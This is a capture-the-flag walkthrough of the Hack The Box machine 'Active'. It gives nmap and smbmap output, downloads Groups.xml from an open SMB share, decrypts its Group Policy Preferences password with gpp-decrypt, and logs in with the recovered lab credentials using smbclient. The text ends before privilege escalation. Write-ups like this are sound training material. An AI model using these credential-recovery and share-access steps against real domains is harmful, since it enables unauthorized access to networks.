# Active-HTB

Nmap report;
````
└─$ cat nmap_report.txt 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-01 15:06 -0300
Nmap scan report for active.htb (10.129.63.188)
Host is up (0.41s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-01 18:04:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (96%), Microsoft Windows 7 (96%), Microsoft Windows Vista SP1 (95%), Microsoft Windows Server 2008 SP1 (95%), Microsoft Windows Server 2008 SP2 or Windows 10 or Xbox One (95%), Microsoft Windows Vista SP0 - SP2, Windows Server 2008, or Windows 7 Ultimate (95%), Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 SP2 (94%), Microsoft Windows Vista SP2 (94%), Microsoft Windows 7 or Windows Server 2008 R2 or Windows 8.1 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-01T18:05:58
|_  start_date: 2026-09-01T17:50:23
|_clock-skew: -1m23s

TRACEROUTE (using port 88/tcp)
HOP RTT       ADDRESS
1   298.55 ms 10.10.16.1
2   472.07 ms active.htb (10.129.63.188)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.93 seconds
````

As always, nmap gives us very usefull information. On port 88 we become aware that we are interacting with a domain server running Windows Server 2008 R2 SP1. Port 389 is running ldap (Lightweight Directory Access Protocol) and the domain name is active.htb. Ldap's common use is a safe place to store usernames and passwords. Also port 445 has a microsoft service called "microsoft-ds" which is commonly associated with SMB via TCP. Let's try to ennumerate SBM. First let's go for smbmap:
````
smbmap -H active.htb
````

The mounted shares are;
````
└─$ smbmap -H active.htb

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.63.188:445       Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
````

But we only have access to Replication. Let's check it but deeper:
````
smbmap -r Replication -H 10.129.63.188 --depth 20
````
This is going to automate the ennumeration of the "Replication" directory:
````
smbmap -r Replication -H 10.129.63.188 --depth 20

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.63.188:445       Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        ./Replication
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    active.htb
        ./Replication//active.htb
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    DfsrPrivate
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Policies
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    scripts
        ./Replication//active.htb/DfsrPrivate
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ConflictAndDeleted
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Deleted
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Installing
        ./Replication//active.htb/Policies
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        fr--r--r--               23 Sat Jul 21 07:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Group Policy
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    USER
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        fr--r--r--              119 Sat Jul 21 07:38:11 2018    GPE.INI
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Microsoft
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Preferences
        fr--r--r--             2788 Sat Jul 21 07:38:11 2018    Registry.pol
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Windows NT
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    SecEdit
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        fr--r--r--             1098 Sat Jul 21 07:38:11 2018    GptTmpl.inf
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Groups
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        fr--r--r--              533 Sat Jul 21 07:38:11 2018    Groups.xml
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        fr--r--r--               22 Sat Jul 21 07:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    USER
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Microsoft
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    Windows NT
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    SecEdit
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 07:37:44 2018    ..
        fr--r--r--             3722 Sat Jul 21 07:38:11 2018    GptTmpl.inf
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
[*] Closed 1 connections
````

The interesting thing here is thsi;
````
        fr--r--r--              533 Sat Jul 21 07:38:11 2018    Groups.xml
````
groups.xml is a group policy file containing credentials readable by anyone in a reversible format. Download it with the follwinc command:
````
smbmap -r Replication -H 10.129.63.188 --depth 20 -A Groups.xml -q
````
Bingo:

<img width="1875" height="47" alt="image" src="https://github.com/user-attachments/assets/441771dd-acce-4174-8463-405f4886928d" />

Credentials stored inside Groups.xml are encryped via Windows Group Policy Preferences (GPP). There is a tools made for reversing this:
````
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
````
Now that we have credentials, let's see what else we can access with smbmap:
````
└─$ smbmap -H 10.129.63.188 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.63.188:445       Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
````

The users directory is wide open. Let's access it via smbclient:
````
smbclient //10.129.63.188/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
````
Go to svc_tgs desktop and get user.txt:
````
smbclient //10.129.63.188/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
````
Now we go to Privescalation.
